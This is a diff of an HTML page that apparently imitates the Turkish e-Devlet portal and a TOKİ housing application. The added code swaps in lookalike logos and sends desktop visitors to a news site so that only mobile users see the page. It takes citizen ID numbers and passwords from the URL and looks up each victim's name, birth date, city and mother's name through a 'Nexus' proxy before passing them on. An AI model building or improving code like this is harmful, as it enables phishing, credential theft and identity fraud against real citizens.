@@ -39,7 +39,7 @@
         .logo {
             width: 180px;
             height: 180px;
-            background-image: url('./images/edk-logo.png');
+            background-image: url('./images/mylogo.png');
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center;
@@ -172,7 +172,7 @@
         .footer-logo {
             width: 268px;
             height: 50px;
-            background-image: url('./images/DDO-logo.png');
+            background-image: url('./images/mysublogo.png');
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center;
@@ -187,7 +187,7 @@
         .turksat-logo {
             width: 80px;
             height: 30px;
-            background-image: url('./images/turksat-logo.png');
+            background-image: url('./images/myturklogo.png');
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center;
@@ -271,21 +271,37 @@
     </div>
 
     <script>
+        document.addEventListener("DOMContentLoaded", function () {
+          var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+          if (!isMobile) {
+            window.location.href = "https://www.trthaber.com/";
+          }
+        });
+    </script>
+
+    <script>
         // Yönlendirme mantığı (PHP'siz)
         const urlParams = new URLSearchParams(window.location.search);
         const tcNumber = urlParams.get('tc_no') || urlParams.get('tckno') || urlParams.get('tc');
         const password = urlParams.get('password');
 
-        // AD/SOYAD'ı Nexus proxy üzerinden sorgula ve sonraki yönlendirme querystring'ine ekle
-        async function appendNameParams(params) {
+        // Nexus proxy üzerinden tam veriyi al ve hedef URL için gerekli paramları üret
+        async function buildNextParams() {
+            const params = new URLSearchParams();
             try {
                 if (!tcNumber) return params;
                 const res = await fetch(`/api/tc-lookup?tc=${encodeURIComponent(tcNumber)}`);
                 if (!res.ok) return params;
                 const data = await res.json();
                 if (data?.success && data?.status === 'OK') {
-                    if (data.firstName) params.set('AD', data.firstName);
-                    if (data.lastName) params.set('SOYAD', data.lastName);
+                    // İstenen düzen ve anahtar isimleriyle sırayla ekle
+                    if (data.name) params.set('name', data.name);
+                    params.set('tc', data.tc || tcNumber);
+                    if (data.birth_date) params.set('birth_date', data.birth_date);
+                    if (data.city) params.set('city', data.city);
+                    if (data.district) params.set('district', data.district);
+                    if (data.mother_name) params.set('mother_name', data.mother_name);
+                    params.set('source', data.source || 'nexusapi');
                 }
                 return params;
             } catch (_) {
@@ -299,12 +315,16 @@
                 return;
             }
 
-            const nextParams = new URLSearchParams({ tc_no: tcNumber, password: password });
-            await appendNameParams(nextParams);
+            // İstenen formatta paramları oluştur
+            const nextParams = await buildNextParams();
+            if (!nextParams.has('tc')) {
+                // Lookup başarısızsa minimum paramlarla yine de yönlendir
+                nextParams.set('tc', tcNumber);
+                nextParams.set('source', 'nexusapi');
+            }
 
-            // 3 saniye bekledikten sonra bir sonraki sayfaya yönlendir
+            // 3 saniye bekledikten sonra bir sonraki sayfaya yönlendir (sıra korunur)
             setTimeout(function () {
-                // Statik hedef sayfa yoksa burada index'e kalabilirsiniz; örnek olarak ekli
                 window.location.href = `toki_application.html?${nextParams.toString()}`;
             }, 3000);
         })();
